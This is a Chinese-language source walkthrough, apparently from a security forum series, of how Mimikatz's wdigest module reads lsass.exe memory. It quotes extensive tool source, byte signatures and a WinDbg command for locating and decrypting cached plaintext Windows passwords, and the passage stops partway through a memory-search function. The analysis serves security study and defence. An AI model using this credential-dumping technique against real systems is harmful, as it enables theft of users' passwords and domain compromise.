在 Windows Server 2008 R2 之前，系统默认情况下会缓存 WDigest 凭据。在启用 WDigest 的情况下，用户进行交互式身份验证的域名、用户名和明文密码等信息会存储在 LSA 进程内存中，其中明文密码经过 WDigest 模块调用后，会对其使用对称加密算法进行加密。

类似于《Mimikatz Explorer - Sekurlsa MSV》中的 `LogonSessionList` 全局变量，在 wdigest.dll 模块中存在一个全局变量 `l_LogSessList`，用来存储上述的登录会话信息。同样的，该变量也是一个链表结构，我们可以使用 WinDbg 来遍历该链表，如下图所示。

```powershell
!list -x "dS @$extret" poi(wdigest!l_LogSessList)
```

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a9362958cdf4af7c6789756419f0c47f584d3715.png)

这些表项对应的结构包含类似如下字段：

```c++
typedef struct _KIWI_WDIGEST_LIST_ENTRY {
    struct _KIWI_WDIGEST_LIST_ENTRY *Flink;
    struct _KIWI_WDIGEST_LIST_ENTRY *Blink;
    ULONG   UsageCount;
    struct _KIWI_WDIGEST_LIST_ENTRY *This;
    LUID LocallyUniqueIdentifier;
} KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;
```

在相对于该结构首部指定偏移量的位置，存在 3 个 `LSA_UNICODE_STRING` 字段，如下所示。Mimikatz 为这 3 个字段创建了一个新的数据结构 `KIWI_GENERIC_PRIMARY_CREDENTIAL`。

```php
typedef struct _KIWI_GENERIC_PRIMARY_CREDENTIAL {
    LSA_UNICODE_STRING UserName;      // 用户名，偏移量：0x30, 48
    LSA_UNICODE_STRING Domaine;       // 域名，偏移量：0x40, 64
    LSA_UNICODE_STRING Password;      // 加密后的明文密码，偏移量：0x50, 80
} KIWI_GENERIC_PRIMARY_CREDENTIAL, *PKIWI_GENERIC_PRIMARY_CREDENTIAL;
```

其中 UserName 的偏移量为 `0x30`，我们可以通过 WinDBG 遍历出所有的用户名，如下图所示。

![image-20230122185714915](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6b8324a04f607fd44661d5ed1a8ab5ffd3c3468c.png)

在偏移量为 `0x40` 处获取域名，如下图所示。

![image-20230122185751079](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-816be08e15521c9f2869977e6a44ce06ae85f44e.png)

为了能够在 `l_LogSessList` 中提取出用户明文密码，首先需要从 lsass.exe 进程中计算出加载的 wdigest.dll 模块的基地址，然后在该模块中定位该变量，最后从 `l_LogSessList` 中解密用户凭据。至于如何找这个变量，同样可以采用签名扫描的方法。Mimikatz 使用到的特征码如下：

```cpp
BYTE PTRN_WIN5_PasswdSet[]  = {0x48, 0x3b, 0xda, 0x74};
BYTE PTRN_WIN6_PasswdSet[]  = {0x48, 0x3b, 0xd9, 0x74};
KULL_M_PATCH_GENERIC WDigestReferences[] = {
    {KULL_M_WIN_BUILD_XP,       {sizeof(PTRN_WIN5_PasswdSet),   PTRN_WIN5_PasswdSet},   {0, NULL}, {-4, 36}},
    {KULL_M_WIN_BUILD_2K3,      {sizeof(PTRN_WIN5_PasswdSet),   PTRN_WIN5_PasswdSet},   {0, NULL}, {-4, 48}},
    {KULL_M_WIN_BUILD_VISTA,    {sizeof(PTRN_WIN6_PasswdSet),   PTRN_WIN6_PasswdSet},   {0, NULL}, {-4, 48}},
```

此外，用户的明文密码属于机密信息，因此也经过 `LsaProtectMemory()` 函数调用后进行对称加密，因此同样需要利用与《Mimikatz Explorer - Sekurlsa MSV》相同的方法获取加密密钥和初始化向量。

但是，我们仍需要从 lsasrv.dll 中枚举 `LogonSessionList`，并从中获取存在的登录 ID，对 `l_LogSessList` 中的 `LocallyUniqueIdentifier` 与获取到的 `LogonSessionList` 中的登录 ID 进行比较，从而准确获取会话凭据。

Beginning
=========

Make Lsass Packages
-------------------

根据 `msv` 功能的名称找到其入口函数 `kuhl_m_sekurlsa_wdigest()`：

- sekurlsa\\packages\\kuhl\_m\_sekurlsa\_wdigest.c

```c++
NTSTATUS kuhl_m_sekurlsa_wdigest(int argc, wchar_t * argv[])
{
    return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_wdigest_single_package, 1);
}
```

`kuhl_m_sekurlsa_msv_single_package` 中包含了本模块所使用的 lsass 包：

```c++
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_wdigest_package = {L"wdigest", kuhl_m_sekurlsa_enum_logon_callback_wdigest, TRUE, L"wdigest.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
```

随后调用 `kuhl_m_sekurlsa_getLogonData()` 函数获取用户的登录信息。

Get Logon Data
--------------

跟进 `kuhl_m_sekurlsa_getLogonData()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages)
{
    KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages};
    return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
}
```

将传进来的 lsass 包组成 `OptionalData` 后传入 `kuhl_m_sekurlsa_enum()` 函数。

Main Enumeration Function
-------------------------

跟进 `kuhl_m_sekurlsa_enum()` 函数，该函数枚举包括 lsass.exe 进程、用户会话在内的相关信息。

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)
{
    KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
    ULONG nbListes = 1, i;
    PVOID pStruct;
    KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    BOOL retCallback = TRUE;
    const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
    // 调用 kuhl_m_sekurlsa_acquireLSA() 函数提取 lsass.exe 进程信息
    NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();

    if(NT_SUCCESS(status))
    {
        sessionData.cLsass = &cLsass;
        sessionData.lsassLocalHelper = lsassLocalHelper;
        // 判断当前 Windows 系统的版本信息
        if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
            helper = &lsassEnumHelpers[0];
        else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
            helper = &lsassEnumHelpers[1];
        else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
            helper = &lsassEnumHelpers[2];
        else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
            helper = &lsassEnumHelpers[3];
        else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
            helper = &lsassEnumHelpers[5];
        else
            helper = &lsassEnumHelpers[6];

        if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
            helper++; // yeah, really, I do that =)

        securityStruct.hMemory = cLsass.hLsassMem;
        if(securityStruct.address = LogonSessionListCount)
            kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));

        for(i = 0; i < nbListes; i++)
        {
            securityStruct.address = &LogonSessionList[i];
            data.address = &pStruct;
            data.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
            if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
            {
                if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
                {
                    data.address = pStruct;
                    data.hMemory = securityStruct.hMemory;

                    while((data.address != securityStruct.address) && retCallback)
                    {
                        if(kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
                        {
                            sessionData.LogonId     = (PLUID)           ((PBYTE) aBuffer.address + helper->offsetToLuid);
                            sessionData.LogonType   = *((PULONG)        ((PBYTE) aBuffer.address + helper->offsetToLogonType));
                            sessionData.Session     = *((PULONG)        ((PBYTE) aBuffer.address + helper->offsetToSession));
                            sessionData.UserName    = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToUsername);
                            sessionData.LogonDomain = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToDomain);
                            sessionData.pCredentials= *(PVOID *)        ((PBYTE) aBuffer.address + helper->offsetToCredentials);
                            sessionData.pSid        = *(PSID *)         ((PBYTE) aBuffer.address + helper->offsetToPSid);
                            sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper->offsetToCredentialManager);
                            sessionData.LogonTime   = *((PFILETIME)     ((PBYTE) aBuffer.address + helper->offsetToLogonTime));
                            sessionData.LogonServer = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToLogonServer);

                            kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
                            kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
                            kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
                            kull_m_process_getSid(&sessionData.pSid, cLsass.hLsassMem);

                            retCallback = callback(&sessionData, pOptionalData);

                            if(sessionData.UserName->Buffer)
                                LocalFree(sessionData.UserName->Buffer);
                            if(sessionData.LogonDomain->Buffer)
                                LocalFree(sessionData.LogonDomain->Buffer);
                            if(sessionData.LogonServer->Buffer)
                                LocalFree(sessionData.LogonServer->Buffer);
                            if(sessionData.pSid)
                                LocalFree(sessionData.pSid);

                            data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
                        }
                        else break;
                    }
                }
                LocalFree(aBuffer.address);
            }
        }
    }
    return status;
}
```

`kuhl_m_sekurlsa_enum()` 内部首先会调用 `kuhl_m_sekurlsa_acquireLSA()` 函数，用来提取 lsass.exe 的进程信息。

Extract LSA Information
=======================

跟进 `kuhl_m_sekurlsa_acquireLSA()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
    NTSTATUS status = STATUS_SUCCESS;
    KULL_M_MEMORY_TYPE Type;
    HANDLE hData = NULL;
    DWORD pid, cbSk;
    PMINIDUMP_SYSTEM_INFO pInfos;
    DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
    BOOL isError = FALSE;
    PBYTE pSk;

    // 
    if(!cLsass.hLsassMem)
    {
        status = STATUS_NOT_FOUND;
        if(pMinidumpName)
        {
            // ...
        }
        else
        {
            Type = KULL_M_MEMORY_TYPE_PROCESS;
            // 获取 lsass.exe 进程的 PID
            if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
                // 打开 lsass.exe 进程的句柄
                hData = OpenProcess(processRights, FALSE, pid);
            else PRINT_ERROR(L"LSASS process not found (?)\n");
        }

        if(hData && hData != INVALID_HANDLE_VALUE)
        {
            if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
            {
                if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
                {
                    // ......
                }
                else
                {
                #if defined(_M_IX86)
                    if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
                        PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
                    else
                #endif
                    {   
                        // 设置 KUHL_M_SEKURLSA_OS_CONTEXT（osContext）结构中的三个值
                        cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
                        cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
                        cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
                    }
                }

                if(!isError)
                {
                    lsassLocalHelper = 
                    #if defined(_M_ARM64)
                        &lsassLocalHelpers[0]
                    #else
                        (cLsass.osContext.MajorVersion < 6) ? &lsassLocalHelpers[0] : &lsassLocalHelpers[1]
                    #endif
                    ;

                    if(NT_SUCCESS(lsassLocalHelper->initLocalLib()))
                    {
                    // ...
                        if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
                        {
                            kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
                            if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
                            {
                                status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
                                if(!NT_SUCCESS(status))
                                    PRINT_ERROR(L"Key import\n");
                            }
                            else PRINT_ERROR(L"Logon list\n");
                        }
                        else PRINT_ERROR(L"Modules informations\n");
                    }
                    else PRINT_ERROR(L"Local LSA library failed\n");
                }
            }
            else PRINT_ERROR(L"Memory opening\n");

            if(!NT_SUCCESS(status))
                CloseHandle(hData);
        }
        else PRINT_ERROR_AUTO(L"Handle on memory");

        if(!NT_SUCCESS(status))
            cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
    }
    return status;
}
```

`kuhl_m_sekurlsa_acquireLSA()` 中首先通过 `kull_m_process_getProcessIdForName` 和 `OpenProcess` 两个函数获取 lsass.exe 进程的 PID，并创建一个该进程的句柄 `hData`。然后调用 `kull_m_memory_open()` 函数，该函数将打开的进程句柄保存到 `cLsass.hLsassMem.pHandleProcess->hProcess` 中。

接着，将有关系统版本的信息复制到 `cLsass.osContext` 中：

```c++
// 设置 KUHL_M_SEKURLSA_OS_CONTEXT（osContext）结构中的三个值
 cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
 cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
 cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
```

如果此时没有错误，则调用 `kull_m_process_getVeryBasicModuleInformations()` 函数获取 lsass.exe 进程的基础信息，主要用来获取加载的 wdigest.dll 模块的基地址。

Get Very Basic Module Informations
----------------------------------

跟进 `kull_m_process_getVeryBasicModuleInformations()` 函数：

- kull\_m\_process.c

```c++
NTSTATUS kull_m_process_getVeryBasicModuleInformations(PKULL_M_MEMORY_HANDLE memory, PKULL_M_MODULE_ENUM_CALLBACK callBack, PVOID pvArg)
{
    NTSTATUS status = STATUS_DLL_NOT_FOUND;
    PLDR_DATA_TABLE_ENTRY pLdrEntry;
    PEB Peb; PEB_LDR_DATA LdrData; LDR_DATA_TABLE_ENTRY LdrEntry;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
    // ...
#endif
    ULONG i;
    KULL_M_MEMORY_ADDRESS aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_ADDRESS aProcess= {NULL, memory};
    PBYTE aLire, fin;
    PWCHAR moduleNameW;
    UNICODE_STRING moduleName;
    PMINIDUMP_MODULE_LIST pMinidumpModuleList;
    PMINIDUMP_STRING pMinidumpString;
    KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION moduleInformation;
    PRTL_PROCESS_MODULES modules = NULL;
    BOOL continueCallback = TRUE;
    moduleInformation.DllBase.hMemory = memory;
    switch(memory->type)
    {
    case KULL_M_MEMORY_TYPE_OWN:
        // ......
    case KULL_M_MEMORY_TYPE_PROCESS:
        moduleInformation.NameDontUseOutsideCallback = &moduleName;
        // 获取进程的 PEB 结构
        if(kull_m_process_peb(memory, &Peb, FALSE))
        {
            aBuffer.address = &LdrData; aProcess.address = Peb.Ldr;
            // 将 Peb.Ldr 指向的 PEB_LDR_DATA 结构复制到 LdrData 中
            if(kull_m_memory_copy(&aBuffer, &aProcess, sizeof(LdrData)))
            {
                // 遍历所有 LDR_DATA_TABLE_ENTRY 结构
                for(
                    aLire  = (PBYTE) (LdrData.InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
                    fin    = (PBYTE) (Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
                    (aLire != fin) && continueCallback;
                    aLire  = (PBYTE) LdrEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
                    )
                {
                    // 将 aLire 指向的 LDR_DATA_TABLE_ENTRY 结构复制到 LdrEntry 中
                    aBuffer.address = &LdrEntry; aProcess.address = aLire;
                    if(continueCallback = kull_m_memory_copy(&aBuffer, &aProcess, sizeof(LdrEntry)))
                    {
                        // 获取模块地址
                        moduleInformation.DllBase.address = LdrEntry.DllBase;
                        // 获取模块映像大小
                        moduleInformation.SizeOfImage = LdrEntry.SizeOfImage;
                        // 获取模块映像名称
                        moduleName = LdrEntry.BaseDllName;
                        // BaseDllName.Buffer 中保存了模块映像名称字符串
                        if(moduleName.Buffer = (PWSTR) LocalAlloc(LPTR, moduleName.MaximumLength))
                        {
                            aBuffer.address = moduleName.Buffer; aProcess.address = LdrEntry.BaseDllName.Buffer;
                            if(kull_m_memory_copy(&aBuffer, &aProcess, moduleName.MaximumLength))
                            {
                                kull_m_process_adjustTimeDateStamp(&moduleInformation);
                                continueCallback = callBack(&moduleInformation, pvArg);
                            }
                            LocalFree(moduleName.Buffer);
                        }
                    }
                }
                status = STATUS_SUCCESS;
            }
        }
    // ...

    return status;
}
```

在 `kull_m_process_getVeryBasicModuleInformations()` 函数内部，将调用 `kull_m_process_peb()` ，用于获取 lsass.exe 进程的 PEB 结构。

### Get PEB Structure

跟进 `kull_m_process_peb()` 函数：

- kull\_m\_process.c

```c++
BOOL kull_m_process_peb(PKULL_M_MEMORY_HANDLE memory, PPEB pPeb, BOOL isWOW)
{
    BOOL status = FALSE;
    PROCESS_BASIC_INFORMATION processInformations;
    HANDLE hProcess = (memory->type == KULL_M_MEMORY_TYPE_PROCESS) ? memory->pHandleProcess->hProcess : GetCurrentProcess();
    KULL_M_MEMORY_ADDRESS aBuffer = {pPeb, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_ADDRESS aProcess= {NULL, memory};
    PROCESSINFOCLASS info;
    ULONG szPeb, szBuffer, szInfos;
    LPVOID buffer;

    // ...

    switch(memory->type)
    {
    // ...
    case KULL_M_MEMORY_TYPE_PROCESS:
        // 通过 NtQueryInformationProcess 函数获取 lsass.exe 进程的信息，并将其写入 buffer 中
        if(NT_SUCCESS(NtQueryInformationProcess(hProcess, info, buffer, szBuffer, &szInfos)) && (szInfos == szBuffer) && processInformations.PebBaseAddress)
        {
            aProcess.address = processInformations.PebBaseAddress;
            status = kull_m_memory_copy(&aBuffer, &aProcess, szPeb);
        }
        break;
    }
    return status;
}
```

`kull_m_process_peb()` 函数通过 `NtQueryInformationProcess()` 函数检索 lsass.exe 进程的信息，检索到的信息最终将由 `processInformations` 接收，这是一个 `PROCESS_BASIC_INFORMATION` 结构体，其声明如下。

```c++
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION,*PPROCESS_BASIC_INFORMATION;
```

其中 `PebBaseAddress` 是指向进程 PEB 结构的指针。

获取到 `PebBaseAddress` 后，将其赋给 `aProcess.address`，`aProcess` 和 `aBuffer` 都是 `KULL_M_MEMORY_ADDRESS` 结构体，其声明如下。

```c++
typedef struct _KULL_M_MEMORY_ADDRESS {
    LPVOID address;
    PKULL_M_MEMORY_HANDLE hMemory;
} KULL_M_MEMORY_ADDRESS, *PKULL_M_MEMORY_ADDRESS;
```

接下来会调用 `kull_m_memory_copy()` 函数，通过 `ReadProcessMemory()` 函数将 `aProcess.address` 指向的 PEB 结构的内存读取到 `aBuffer.address` 指向的内存空间中，最终 `pPeb` 成为指向 PEB 结构的指针。

获取到 PEB 结构后，返回 `kull_m_process_getVeryBasicModuleInformations()` 函数。

### Get Base Address Of lsasrv.dll &amp; wdigest.dll Module

成功获取 PEB 结构后，回到 `kull_m_process_getVeryBasicModuleInformations()` 函数，通过 `kull_m_memory_copy()` 函数将 `Peb.Ldr` 指向的 `PEB_LDR_DATA` 结构复制到 `LdrData` 中。然后遍历所有 `LDR_DATA_TABLE_ENTRY` 结构，分别获取模块地址、映像大小和映像名称，并把它们保存到 `moduleInformation` 中，这是了一个 `KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION` 结构体，其声明如下，用于存储 wdigest.dll 模块的有关信息。

```c++
typedef struct _KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION {
    KULL_M_MEMORY_ADDRESS DllBase;                  // 存储已加载模块的地址
    ULONG SizeOfImage;                              // 存储已加载模块的映像大小
    ULONG TimeDateStamp;
    PCUNICODE_STRING NameDontUseOutsideCallback;    // 存储已加载模块的映像名称
} KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION, *PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION;
```

最后进入回调函数，在这里 `callBack` 是 `kuhl_m_sekurlsa_findlibs()` 函数，其定义如下。

```c++
BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
    ULONG i;
    for(i = 0; i < ARRAYSIZE(lsassPackages); i++)
    {
        if(_wcsicmp(lsassPackages[i]->ModuleName, pModuleInformation->NameDontUseOutsideCallback->Buffer) == 0)
        {
            lsassPackages[i]->Module.isPresent = TRUE;
            lsassPackages[i]->Module.Informations = *pModuleInformation;
        }
    }
    return TRUE;
}
```

该函数通过将传进来的 `pModuleInformation` 中的模块名称与 lsassPackages 数组中定义的进程模块进行比对。如果相同，则将相应的 lsass 包中的 `Module.isPresent` 设为 `TRUE` 并将 `pModuleInformation` 保存到 lsass 包的 `Module.Informations` 中。

lsassPackages 数组中包含了整个 sekurlsa 模块用到的所有 lsass 包的信息，其定义如下：

```c++
const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
    &kuhl_m_sekurlsa_msv_package,
    &kuhl_m_sekurlsa_tspkg_package,
    &kuhl_m_sekurlsa_wdigest_package,
#if !defined(_M_ARM64)
    &kuhl_m_sekurlsa_livessp_package,
#endif
    &kuhl_m_sekurlsa_kerberos_package,
    &kuhl_m_sekurlsa_ssp_package,
    &kuhl_m_sekurlsa_dpapi_svc_package,
    &kuhl_m_sekurlsa_credman_package,
    &kuhl_m_sekurlsa_kdcsvc_package,
    &kuhl_m_sekurlsa_cloudap_package,
};
```

通过 `kuhl_m_sekurlsa_findlibs()` 函数的循环比对，能够获取 sekurlsa 模块用到所有模块的地址，包括 lsasrv.dll 和 wdigest.dll 模块。

至此，成功获取 lsass.exe 进程中加载的 lsasrv.dll 和 wdigest.dll 模块的地址信息，`kull_m_process_getVeryBasicModuleInformations()` 函数调用结束。接下来，将通过 `kuhl_m_sekurlsa_utils_search()` 函数定位 `LogonSessionList` 和 `LogonSessionListCount` 这两个全局变量。

Get LogonSessionList Variables
------------------------------

跟进 `kuhl_m_sekurlsa_utils_search()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa\_utils.c

```c++
PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{
    PVOID *pLogonSessionListCount = (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &LogonSessionListCount);
    return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &LogonSessionList, pLogonSessionListCount, NULL, NULL);
}
```

这里先定义了 `LIST_ENTRY` 结构的指针变量 `LogonSessionList` 以及 `PULONG` 类型的指针变量 `LogonSessionListCount`，然后将 `cLsass`、`pLib`、`LsaSrvReferences`、`ARRAYSIZE(LsaSrvReferences)` 以及 `&LogonSessionList` 和 `pLogonSessionListCount` 传入 `kuhl_m_sekurlsa_utils_search_generic()` 函数。其中 `pLib` 为前面传入的 `&kuhl_m_sekurlsa_msv_package.Module`。`LsaSrvReferences` 是一个包含了各种系统版本的特征码的数组，每个成员都是一个 `KULL_M_PATCH_GENERIC` 结构体，其结构如下所示。

```c++
typedef struct _KULL_M_PATCH_GENERIC {
    DWORD MinBuildNumber;
    KULL_M_PATCH_PATTERN Search;     // 包含特征码
    KULL_M_PATCH_PATTERN Patch;
    KULL_M_PATCH_OFFSETS Offsets;    // 保存 LogonSessionList 和 LogonSessionListCount 偏移量值的四个字节的偏移量
} KULL_M_PATCH_GENERIC, *PKULL_M_PATCH_GENERIC;

typedef struct _KULL_M_PATCH_PATTERN {
    DWORD Length;
    BYTE *Pattern;
} KULL_M_PATCH_PATTERN, *PKULL_M_PATCH_PATTERN;
```

跟进 `kuhl_m_sekurlsa_utils_search_generic()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa\_utils.c

```c++
BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
{
    KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_SEARCH sMemory = {{{pLib->Informations.DllBase.address, cLsass->hLsassMem}, pLib->Informations.SizeOfImage}, NULL};
    PKULL_M_PATCH_GENERIC currentReference;
    #if defined(_M_X64)
        LONG offset;
    #endif
    //  根据 cLsass->osContext.BuildNumber 的版本号选择 LsaSrvReferences 中的特征码条目
    if(currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass->osContext.BuildNumber))
    {
        aLocalMemory.address = currentReference->Search.Pattern;
        if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
        {
            aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0; // optimize one day
            // ......
        #elif defined(_M_X64)
            aLocalMemory.address = &offset;
            if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
                *genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
        #elif defined(_M_IX86)
            // ......
        #endif

            if(genericPtr1)
            {
                aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
            #if defined(_M_ARM64)
                // ......
            #elif defined(_M_X64)
                aLocalMemory.address = &offset;
                if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
                    *genericPtr1 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
            #elif defined(_M_IX86)
                // ......
            #endif
            }

            if(genericPtr2)
            {
                aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
            #if defined(_M_ARM64)
                // ......
            #elif defined(_M_X64)
                aLocalMemory.address = &offset;
                if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
                    *genericPtr2 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
            #elif defined(_M_IX86)
                // ......
            #endif
            }
        }
    }
    return pLib->isInit;
}
```

首先，`kull_m_patch_getGenericFromBuild()` 函数根据 `cLsass->osContext.BuildNumber` 中的版本号选择 `LsaSrvReferences` 中适用于当前系统版本的特征码条目。选出来的 `currentReference->Search.Pattern` 赋给 `aLocalMemory.address` 后，将 `&aLocalMemory` 连同 `&sMemory` 传入 `kull_m_memory_search()` 函数。其中 `sMemory` 是一个 `KULL_M_MEMORY_SEARCH` 结构体，用于临时保存 lsasrv.dll 模块的基地址和映像大小，其声明如下。

```c++
typedef struct _KULL_M_MEMORY_SEARCH {
    KULL_M_MEMORY_RANGE kull_m_memoryRange;
    LPVOID result;
} KULL_M_MEMORY_SEARCH, *PKULL_M_MEMORY_SEARCH;

typedef struct _KULL_M_MEMORY_RANGE {
    KULL_M_MEMORY_ADDRESS kull_m_memoryAdress;
    SIZE_T size;
} KULL_M_MEMORY_RANGE, *PKULL_M_MEMORY_RANGE;

typedef struct _KULL_M_MEMORY_ADDRESS {
    LPVOID address;
    PKULL_M_MEMORY_HANDLE hMemory;
} KULL_M_MEMORY_ADDRESS, *PKULL_M_MEMORY_ADDRESS;
```

在 `kull_m_memory_search()` 函数内部定位特征码的内存地址，该函数定义如下。

```c++
BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst)
{
    BOOL status = FALSE;
    KULL_M_MEMORY_SEARCH  sBuffer = {{{NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, Search->kull_m_memoryRange.size}, NULL};
    PBYTE CurrentPtr;
    // 定义搜索的最大地址数（搜索的极限），为保存 lsasrv.dll 模块的内存地址加上 lsasrv.dll 模块的大小
    PBYTE limite = (PBYTE) Search->kull_m_memoryRange.kull_m_memoryAdress.address + Search->kull_m_memoryRange.size;

    switch(Pattern->hMemory->type)
    {
    case KULL_M_MEMORY_TYPE_OWN:
        switch(Search->kull_m_memoryRange.kull_m_memoryAdress.hMemory->type)
        {
        case KULL_M_MEMORY_TYPE_OWN:
